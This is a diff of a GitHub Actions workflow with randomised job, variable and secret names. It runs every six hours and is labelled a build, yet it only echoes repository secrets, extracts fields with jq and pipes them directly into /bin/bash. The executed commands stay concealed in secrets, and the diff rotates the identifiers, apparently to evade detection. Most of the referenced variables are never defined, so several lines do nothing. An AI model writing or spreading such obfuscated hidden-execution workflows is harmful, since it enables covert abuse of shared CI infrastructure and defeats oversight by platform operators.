@@ -1,23 +1,22 @@
 name: juiceqinzq
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 4/6 * * *'
+    - cron: '49 4/6 * * *'
 
-jobs:  # 15444
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: juiceqinzq
         env:
-          hacof56544: ${{ secrets.hacof56544 }}
+          amoh63721: ${{ secrets.amoh63721 }}
         run: |
-          echo $hacof56544 | jq -r .iqdgp64 | /bin/bash
-          echo $f709 | jq -r .pt69 | /bin/bash
-          echo $edn4705 | jq -r .ioy7 | /bin/bash
-          echo $l53 | jq -r .fd47 | /bin/bash
-          echo $zu701 | jq -r .tj4 | /bin/bash
-          echo $mskgh601 | jq -r .jizdc24209 | /bin/bash
+          echo $amoh63721 | jq -r .si2497 | /bin/bash
+          echo $tfxl490 | jq -r .hudn20955 | /bin/bash
+          echo $rfucd97 | jq -r .funkv90746 | /bin/bash
+          echo $qar84 | jq -r .d55203 | /bin/bash
+          echo $zah79336 | jq -r .o39232 | /bin/bash
 
